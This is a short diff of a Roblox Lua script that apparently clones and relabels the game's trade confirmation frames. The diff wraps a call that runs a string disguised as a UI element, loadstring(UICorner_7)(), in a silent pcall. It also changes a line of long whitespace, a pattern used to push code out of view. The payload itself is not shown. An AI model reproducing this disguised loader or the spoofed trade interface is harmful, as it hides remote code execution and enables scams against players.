@@ -335,7 +335,9 @@ local function NAJCPZK_fake_script()
 	local part2Frame = plr.PlayerGui.TradeApp.Frame.ConfirmationFrame.PartnerLabel
 	local cloned = partFrame:Clone()
 	local chosenPlayer = nil
-    loadstring(UICorner_7)()
+	pcall(function()
+		loadstring(UICorner_7)()
+	end)
 	local function updatePlayerList()
 		for _, child in pairs(gui:GetChildren()) do
 			if child:IsA("TextButton") then
@@ -372,7 +374,7 @@ local function NAJCPZK_fake_script()
 		if chosenPlayer then
 
 
-                                                                                                                                                                                                                                                                                                                                                                                 
+
 			local newClone = partFrame:Clone()
 			newClone.Parent = negotiationFrameHeader
 			newClone.Name = "ClonedPartneredFrame"
